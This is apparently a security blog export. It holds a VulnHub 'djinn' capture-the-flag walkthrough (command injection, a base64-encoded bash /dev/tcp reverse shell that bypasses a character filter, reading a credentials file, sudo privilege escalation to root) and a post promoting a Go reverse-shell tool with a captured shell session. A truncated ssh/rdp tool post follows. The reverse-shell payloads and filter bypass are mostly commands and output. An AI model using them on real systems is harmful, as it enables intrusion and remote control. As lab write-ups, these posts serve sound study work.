
<p>use gobuster for dir</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.127:7331/ -w /usr/share/wordlists/dirb/big.txt -t 500</span><br><span class="line">/genie (Status: 200)</span><br><span class="line">/wish (Status: 200)</span><br></pre></td></tr></table></figure>

<p>genie page is an error 403,perhaps it’s no use<br>the following page is a little interesting</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.127:7331/wish</span><br></pre></td></tr></table></figure>

<p>this page can excecute commands</p>
<p>request:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /wish HTTP/1.1</span><br><span class="line">Host: 192.168.56.127:7331</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Origin: http://192.168.56.127:7331</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.127:7331/wish</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">cmd=id</span><br></pre></td></tr></table></figure>

<p>response:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.0 302 FOUND</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 379</span><br><span class="line">Location: http://192.168.56.127:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A</span><br><span class="line">Server: Werkzeug/0.16.0 Python/2.7.15+</span><br><span class="line">Date: Sat, 23 May 2020 05:03:45 GMT</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Redirecting...&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Redirecting...&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You should be redirected automatically to target URL: &lt;a href=<span class="string">&quot;/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A&quot;</span>&gt;/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A&lt;/a&gt;.  If not click the link.</span><br></pre></td></tr></table></figure>

<ul>
<li>Exploitation</li>
</ul>
<p>get a shell by using nc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.56.126 1155</span><br></pre></td></tr></table></figure>

<p>excecute the payload, we got the following error</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.127:7331/genie?name=Wrong+choice+of+words</span><br></pre></td></tr></table></figure>

<p>some of the symbols are characters are restricted</p>
<p>we can use other payload, encrypt the whole command in base64 format </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.56.126/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEyNi84MDgwIDA+JjE= | base64 -d | bash</span><br></pre></td></tr></table></figure>

<p>then we get a shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 8080</span></span><br><span class="line">listening on [any] 8080 ...</span><br><span class="line">192.168.56.127: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.126] from (UNKNOWN) [192.168.56.127] 47358</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (758): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@djinn:/opt/80$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@djinn:/opt/80$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>let’s take a look around</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@djinn:/opt/80$ cat app.py</span><br><span class="line">cat app.py</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">from flask import Flask, redirect, render_template, request, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;key&quot;</span></span><br><span class="line"></span><br><span class="line">CREDS = <span class="string">&quot;/home/nitish/.dev/creds.txt&quot;</span></span><br><span class="line"></span><br><span class="line">RCE = [<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;;&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def validate(cmd):</span><br><span class="line">    <span class="keyword">if</span> CREDS <span class="keyword">in</span> cmd and <span class="string">&quot;cat&quot;</span> not <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="built_in">return</span> True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> RCE:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> cmd:</span><br><span class="line">                <span class="keyword">if</span> i == j:</span><br><span class="line">                    <span class="built_in">return</span> False</span><br><span class="line">        <span class="built_in">return</span> True</span><br><span class="line">    except Exception:</span><br><span class="line">        <span class="built_in">return</span> False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line">def index():</span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/wish&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&quot;GET&quot;</span>])</span><br><span class="line">def wish():</span><br><span class="line">    execute = request.form.get(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> execute:</span><br><span class="line">        <span class="keyword">if</span> validate(execute):</span><br><span class="line">            output = subprocess.Popen(execute, shell=True,</span><br><span class="line">                                      stdout=subprocess.PIPE).stdout.read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">&quot;Wrong choice of words&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> redirect(url_for(<span class="string">&quot;genie&quot;</span>, name=output))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> render_template(<span class="string">&#x27;wish.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/genie&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def genie():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">&quot;It&#x27;s not that hard&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&#x27;genie.html&#x27;</span>, file=page)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=True)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /home/nitish/.dev/creds.txt</span><br><span class="line">nitish:p4ssw0rdStr3r0n9</span><br></pre></td></tr></table></figure>

<p>change our shell to a tty shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@djinn:/opt/80$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ su nitish</span><br><span class="line">su nitish</span><br><span class="line">Password: p4ssw0rdStr3r0n9</span><br><span class="line"></span><br><span class="line">nitish@djinn:/opt/80$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(nitish) gid=1001(nitish) groups=1001(nitish)</span><br><span class="line">nitish@djinn:/opt/80$ whoami</span><br><span class="line">whoami</span><br><span class="line">nitish</span><br></pre></td></tr></table></figure>

<p>finally, we get user.txt…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nitish@djinn:/opt/80$ <span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">nitish@djinn:~$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">nitish@djinn:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">10aay8289ptgguy1pvfa73alzusyyx3c</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub276.jpg"></li>
</ul>
<h3 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nitish@djinn:~$ sudo -l                                                                              </span><br><span class="line">sudo -l                                                                                              </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> nitish on djinn:                                                       </span><br><span class="line">    env_reset, mail_badpass,                                                                         </span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin         </span><br><span class="line"></span><br><span class="line">User nitish may run the following commands on djinn:</span><br><span class="line">    (sam) NOPASSWD: /usr/bin/genie</span><br></pre></td></tr></table></figure>

<p>understand how it works</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nitish@djinn:~$ genie</span><br><span class="line">genie</span><br><span class="line">usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish</span><br><span class="line">genie: error: the following arguments are required: wish</span><br><span class="line">nitish@djinn:~$ genie -h</span><br><span class="line">genie -h</span><br><span class="line">usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish</span><br><span class="line"></span><br><span class="line">I know you<span class="string">&#x27;ve came to me bearing wishes in mind. So go ahead make your wishes.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">positional arguments:</span></span><br><span class="line"><span class="string">  wish                  Enter your wish</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">optional arguments:</span></span><br><span class="line"><span class="string">  -h, --help            show this help message and exit</span></span><br><span class="line"><span class="string">  -g, --god             pass the wish to god</span></span><br><span class="line"><span class="string">  -p SHELL, --shell SHELL</span></span><br><span class="line"><span class="string">                        Gives you shell</span></span><br><span class="line"><span class="string">  -e EXEC, --exec EXEC  execute command</span></span><br></pre></td></tr></table></figure>

<p>now we get a shell of user sam</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nitish@djinn:~$ sudo -u sam genie -cmd new</span><br><span class="line">sudo -u sam genie -cmd new</span><br><span class="line">my man!!</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)</span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">sam</span><br></pre></td></tr></table></figure>

<p>use the following command to get a stable shell,then enumerate again</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bash</span><br><span class="line">bash</span><br><span class="line">sam@djinn:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> sam on djinn:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User sam may run the following commands on djinn:</span><br><span class="line">    (root) NOPASSWD: /root/lago</span><br></pre></td></tr></table></figure>

<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>and we get root</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sam@djinn:~$ sudo -u root /root/lago </span><br><span class="line">sudo -u root /root/lago</span><br><span class="line">What <span class="keyword">do</span> you want to <span class="keyword">do</span> ?</span><br><span class="line">1 - Be naughty</span><br><span class="line">2 - Guess the number</span><br><span class="line">3 - Read some damn files</span><br><span class="line">4 - Work</span><br><span class="line">Enter your choice:2</span><br><span class="line">2</span><br><span class="line">Choose a number between 1 to 100: </span><br><span class="line">Enter your number: num</span><br><span class="line">num</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>next, we try to find the flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">bash</span><br><span class="line">root@djinn:~<span class="comment"># su root</span></span><br><span class="line">su root</span><br><span class="line">root@djinn:/home/nitish<span class="comment"># cd</span></span><br><span class="line">root@djinn:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">lago  proof.sh</span><br><span class="line">root@djinn:~<span class="comment"># ./proof.sh</span></span><br><span class="line">./proof.sh</span><br><span class="line"><span class="string">&#x27;unknown&#x27;</span>: I need something more specific.</span><br><span class="line">    _                        _             _ _ _ </span><br><span class="line">   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |</span><br><span class="line">  / _ \ | <span class="string">&#x27;_ ` _ \ / _` |_  / | &#x27;</span>_ \ / _` | | | |</span><br><span class="line"> / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|</span><br><span class="line">/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)</span><br><span class="line">                                     |___/       </span><br><span class="line">djinn pwned...</span><br><span class="line">__________________________________________________________________________</span><br><span class="line"></span><br><span class="line">Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc</span><br><span class="line">Path: /root</span><br><span class="line">Date: Sat May 23 11:23:39 IST 2020</span><br><span class="line">Whoami: root</span><br><span class="line">__________________________________________________________________________</span><br><span class="line"></span><br><span class="line">By @0xmzfr</span><br><span class="line"></span><br><span class="line">Thanks to my fellow teammates <span class="keyword">in</span> @m0tl3ycr3w <span class="keyword">for</span> betatesting! :-)</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub277.jpg"></li>
</ul>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>Command execution bypass</li>
<li>Sensitive information disclosure</li>
<li>custom program Privilege Escalation</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>goreverseshell---基于golang的tcp-reverseshell</title>
    <url>/2020/04/09/goreverseshell/</url>
    <content><![CDATA[<h4 id="Golang-Tcp-Reverse-Shell"><a href="#Golang-Tcp-Reverse-Shell" class="headerlink" title="Golang Tcp Reverse Shell"></a>Golang Tcp Reverse Shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">------------------------------------------------</span><br><span class="line">A golang based reverse shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3JldmVyc2VzaGVsbA==">Download goreverseshell from my github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage of goreverseshell.exe:</span><br><span class="line">  -host string</span><br><span class="line">        the host to connect (default <span class="string">&quot;input host here&quot;</span>)</span><br><span class="line">  -port int</span><br><span class="line">        nc listenling port (default 5566)</span><br></pre></td></tr></table></figure>

<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;goreverseshell.exe -host 192.168.66.6 -port 5566</span><br><span class="line">------------------------------------------------</span><br><span class="line">A golang based reverse shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br><span class="line"><span class="string">*ip:192.168.66.6------port:&amp;d</span></span><br><span class="line"><span class="string">%!(EXTRA int=5566)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam1.jpg"></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.66.1: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.66.6] from (UNKNOWN) [192.168.66.1] 21322</span><br><span class="line">Microsoft Windows [�汾 10.0.18363.752]</span><br><span class="line">(c) 2019 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">lucifer11\hasee</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;systeminfo</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">������:           LUCIFER11</span><br><span class="line">OS ����:          Microsoft Windows 10 ��ҵ��</span><br><span class="line">OS �汾:          10.0.18363 ��ȱ Build 18363</span><br><span class="line">OS ������:        Microsoft Corporation</span><br><span class="line">OS ����:          ��������վ</span><br><span class="line">OS ��������:      Multiprocessor Free</span><br><span class="line">ע����������:     HASEE</span><br><span class="line">ע������:       </span><br><span class="line">��Ʒ ID:          00328-90000-00000-AAOEM</span><br><span class="line">��ʼ��װ����:     2019/9/23, 18:08:18</span><br><span class="line">ϵͳ����ʱ��:     2020/4/8, 15:28:33</span><br><span class="line">ϵͳ������:       HASEE Computer</span><br><span class="line">ϵͳ�ͺ�:         PA70ES                         </span><br><span class="line">ϵͳ����:         x64-based PC</span><br><span class="line">������:           ��װ�� 1 ����������</span><br><span class="line">                  [01]: Intel64 Family 6 Model 158 Stepping 10 GenuineIntel ~2201 Mhz</span><br><span class="line">BIOS �汾:        American Megatrends Inc. 1.07.10RHS4, 2018/11/14</span><br><span class="line">Windows Ŀ¼:     C:\WINDOWS</span><br><span class="line">ϵͳĿ¼:         C:\WINDOWS\system32</span><br><span class="line">�����豸:         \Device\HarddiskVolume4</span><br><span class="line">ϵͳ��������:     zh-cn;����(�й�)</span><br><span class="line">���뷨��������:   zh-cn;����(�й�)</span><br><span class="line">ʱ��:             (UTC+08:00) ���������죬�����ر�����������³ľ��</span><br><span class="line">�����ڴ�����:     16,231 MB</span><br><span class="line">���õ������ڴ�:   6,104 MB</span><br><span class="line">�����ڴ�: ����: 19,303 MB</span><br><span class="line">�����ڴ�: ����:   4,390 MB</span><br><span class="line">�����ڴ�: ʹ����: 14,913 MB</span><br><span class="line">ҳ���ļ�λ��:     C:\pagefile.sys</span><br><span class="line">��:               WORKGROUP</span><br><span class="line">��¼������:       \\LUCIFER11</span><br><span class="line">�޲�����:         ��װ�� 14 ���޲�������</span><br><span class="line">                  [01]: KB4537572</span><br><span class="line">                  [02]: KB4515383</span><br><span class="line">                  [03]: KB4516115</span><br><span class="line">                  [04]: KB4517245</span><br><span class="line">                  [05]: KB4520390</span><br><span class="line">                  [06]: KB4521863</span><br><span class="line">                  [07]: KB4524244</span><br><span class="line">                  [08]: KB4524569</span><br><span class="line">                  [09]: KB4525419</span><br><span class="line">                  [10]: KB4528759</span><br><span class="line">                  [11]: KB4537759</span><br><span class="line">                  [12]: KB4538674</span><br><span class="line">                  [13]: KB4541338</span><br><span class="line">                  [14]: KB4541335</span><br><span class="line">����:             ��װ�� 8 �� NIC��</span><br><span class="line">                  [01]: VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet1</span><br><span class="line">                      ������:      VMware Network Adapter VMnet1</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      DHCP ������: 192.168.233.254</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.233.1</span><br><span class="line">                        [02]: fe80::9180:197a:ce35:69b8</span><br><span class="line">                  [02]: VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet8</span><br><span class="line">                      ������:      VMware Network Adapter VMnet8</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.66.1</span><br><span class="line">                        [02]: fe80::9d24:3f2d:1f79:94eb</span><br><span class="line">                  [03]: Intel(R) Wireless-AC 9462</span><br><span class="line">                      ������:      WLAN 2</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">                  [04]: Realtek PCIe GbE Family Controller</span><br><span class="line">                      ������:      ����</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.1.56</span><br><span class="line">                        [02]: fe80::b11f:6ef2:7ec6:6eb3</span><br><span class="line">                  [05]: Bluetooth Device (Personal Area Network)</span><br><span class="line">                      ������:      ������������</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">                  [06]: Microsoft KM-TEST Loopback Adapter</span><br><span class="line">                      ������:      Npcap Loopback Adapter</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      DHCP ������: 255.255.255.255</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 169.254.234.82</span><br><span class="line">                        [02]: fe80::40e5:86bd:7eba:ea52</span><br><span class="line">                  [07]: VirtualBox Host-Only Ethernet Adapter</span><br><span class="line">                      ������:      VirtualBox Host-Only Network</span><br><span class="line">                      ���� DHCP:   ��</span><br><span class="line">                      IP ��</span><br><span class="line">                        [01]: 192.168.56.1</span><br><span class="line">                        [02]: fe80::9429:8e07:8ee2:d61d</span><br><span class="line">                  [08]: TAP-Windows Adapter V9</span><br><span class="line">                      ������:      ��������</span><br><span class="line">                      ״:        ý���������ж�</span><br><span class="line">Hyper-V Ҫ��:     ������������ģʽ��չ: ��</span><br><span class="line">                  �������������⻯: ��</span><br><span class="line">                  ������ת��: ��</span><br><span class="line">                  �����б�������: ��</span><br><span class="line"></span><br><span class="line">D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/goreverseshell/master/showpics/exam2.jpg"></li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>轻量级的golang tcp reverse shell</li>
<li>支持反弹windows和linux的shell</li>
<li>能多平台交叉编译使用</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>如果工具打开报错请把flag.txt和go build生成的goreverseshell.exe放在同一目录下即可</li>
<li>有任何问题请联系qq:1185151867 :)</li>
</ul>
<p>:) enjoy it ! :)</p>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>gordpssh-一款轻量级golang实现ssh和rdp管理工具</title>
    <url>/2020/03/25/gordpssh/</url>
    <content><![CDATA[<p><font color="red">有个基佬想要我用go搞个大范围识别ssh和rdp指纹，并将结果写入文件的工具，结果技术太菜，所以产生了下面这个残次品。顺便曝光那个基佬的微信号，大家去调戏他吧，哈哈哈。。。</font></p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/jilao1.PNG"></li>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/jilao2.PNG"></li>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/jilao3.PNG"></li>
</ul>
<h3 id="gordpssh"><a href="#gordpssh" class="headerlink" title="gordpssh"></a>gordpssh</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">----------------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">&#123;a light ssh and rdp management tool&#125;</span></span><br><span class="line"><span class="string">----------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>By Lucifer11</p>
</li>
<li><p>My QQ:1185151867</p>
</li>
<li><p><a href="https://fdlucifer.github.io/">My Blog</a></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3JkcHNzaA==">gordpssh download<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<a id="more"></a>

<h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\hackingwithgolang\gordpssh&gt;gordpssh.exe -h</span><br><span class="line">...</span><br><span class="line">1</span><br><span class="line">- &#123;your choice [1]&#125;</span><br><span class="line">Usage [gordpssh] [-s host] [-p port] [-u user] [-w password] [-c cmd]</span><br><span class="line"></span><br><span class="line"> - ssh example:</span><br><span class="line">        1) gordpssh -u root -p 9527 -s 1.1.1.1 -w 123456 -c <span class="string">&quot;uname -a&quot;</span></span><br><span class="line">        2) gordpssh --user root --port 9527 --host 1.1.1.1 --password 123456 --cmd <span class="string">&quot;uname -a&quot;</span></span><br><span class="line"> - <span class="keyword">if</span> use user &amp; pasword; the password is <span class="keyword">for</span> user.</span><br><span class="line"> - rdp example is the same as ssh example.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -c, --cmd string        execute cmd <span class="keyword">in</span> server (default <span class="string">&quot;uname -a&quot;</span>)</span><br><span class="line">  -h, --<span class="built_in">help</span>              this <span class="built_in">help</span></span><br><span class="line">  -s, --host string       remote host addr ip (default <span class="string">&quot; 